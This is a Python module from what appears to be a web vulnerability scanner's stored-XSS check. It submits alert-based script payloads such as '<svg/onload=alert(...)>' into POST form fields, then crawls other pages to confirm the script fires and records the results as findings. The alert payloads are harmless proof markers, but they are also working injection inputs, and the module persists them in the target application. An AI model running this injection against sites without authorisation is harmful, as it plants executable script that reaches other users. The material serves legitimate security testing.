"""SV1 - stored XSS. Write the payload, walk the site, watch for the bell.

A stored payload is the same bug as reflected XSS but the proof page is not
the page you posted to. Submit, then revisit every crawled page and check
whether the marker fired there.
"""

from __future__ import annotations

from . import browser as browser_mod
from . import config, crawl
from .models import Finding, Page

TEXT_TYPES = ("text", "search", "url", "email", "tel", "textarea", "select", "")


def _fields(form) -> list:
    usable = []
    for item in form.fields:
        kind = (item.type or "").lower()
        if kind in ("submit", "button", "image", "reset", "file", "hidden", "checkbox", "radio"):
            continue
        if kind not in TEXT_TYPES:
            continue
        usable.append(item)
    return usable[: config.STORED_TEST_FIELDS]


def _payloads(token: str) -> list[str]:
    return [
        f"<svg/onload=alert('{token}')>",
        f'"><script>alert(\'{token}\')</script>',
    ]


def _token(index: int) -> str:
    return f"sv1stored{index:02d}"


def _shot_path(root: str, index: int) -> str:
    return f"{root}/stored-{index:02d}.png"


def run(engine: browser_mod.Browser, pages: list[Page], artifacts: str) -> list[Finding]:
    if not engine.enabled:
        return []

    forms = []
    for page in pages:
        for form in page.forms:
            if form.method == "post" and _fields(form) and crawl.form_endpoint(page.url, form):
                forms.append((page.url, form))
    forms = forms[: config.STORED_MAX_FORMS]
    if not forms:
        return []

    findings: list[Finding] = []
    visited_pages = [page.url for page in pages][: config.STORED_MAX_PAGES]

    for form_index, (page_url, form) in enumerate(forms):
        revisit = [page_url] + [url for url in visited_pages if url != page_url]
        revisit = revisit[: config.STORED_MAX_PAGES]
        for field_index, item in enumerate(_fields(form)):
            token = _token(form_index * 10 + field_index)
            payload = _payloads(token)[0]
            engine.submit_form(page_url, form, payload, item.name)

            for page in revisit:
                shot_path = _shot_path(artifacts, len(findings) + 1) if artifacts else ""
                visit = engine.visit(page, shot_path=shot_path)
                if not visit.fired(token):
                    continue
                findings.append(
                    Finding(
                        kind="XSS",
                        severity="HIGH",
                        url=page,
                        method="GET",
                        param=item.name,
                        payload=payload,
                        confidence="CONFIRMED",
                        evidence=f"stored through POST {page_url} and executed on {visit.url}: "
                                 f"{visit.proof(token)}",
                        technique="stored",
                        detail="the payload was persisted by the application and ran on another page",
                        artifact=visit.screenshot,
                    )
                )
                break
    return _dedupe(findings)


def _dedupe(findings: list[Finding]) -> list[Finding]:
    seen: set[tuple] = set()
    ordered: list[Finding] = []
    for finding in findings:
        key = (finding.url, finding.param, finding.technique)
        if key in seen:
            continue
        seen.add(key)
        ordered.append(finding)
    return ordered
